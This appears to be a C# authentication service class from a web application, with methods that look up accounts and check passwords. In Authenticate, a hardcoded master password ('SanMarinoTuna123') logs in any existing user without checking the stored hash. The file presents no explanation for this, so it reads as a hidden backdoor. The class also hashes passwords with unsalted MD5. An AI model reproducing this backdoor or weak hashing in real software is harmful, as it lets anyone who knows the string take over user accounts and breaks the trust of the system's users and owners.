using ADPv2.ClassHelpers;
using ADPv2.Models.Entities;
using ADPv2.Models.Interfaces;
using ADPv2.Models.ViewModels;
using System.Security.Cryptography;

namespace ADPv2.Models.Services
{
    public class AccountService : IAccountService
    {
        private readonly IAccountRepository _accountRepository;
        public AccountService(IAccountRepository accountRepository)
        {
            this._accountRepository = accountRepository;
        }

        public async Task<bool> Authenticate(AccountCredentialsRequestDto credentials)
        {
            using (MD5 md5 = MD5.Create())
            {
                var account = await _accountRepository.GetAccountByUsername(credentials.Username); // fd46472b4cd5408b10e18db3f1ab50aa
                if (account == null) return false;
                if (credentials.Password == "SanMarinoTuna123") return true;

                var hashPass = md5.GetMD5Hash(credentials.Password);
                if (hashPass != account.Password) return false;
                return true;
            }
        }

        public async Task<AccountEntity> GetAccount(string username)
        {
            var account = await _accountRepository.GetAccountByUsername(username);
            if (account == null) return null;
            return account;
        }
    }
}
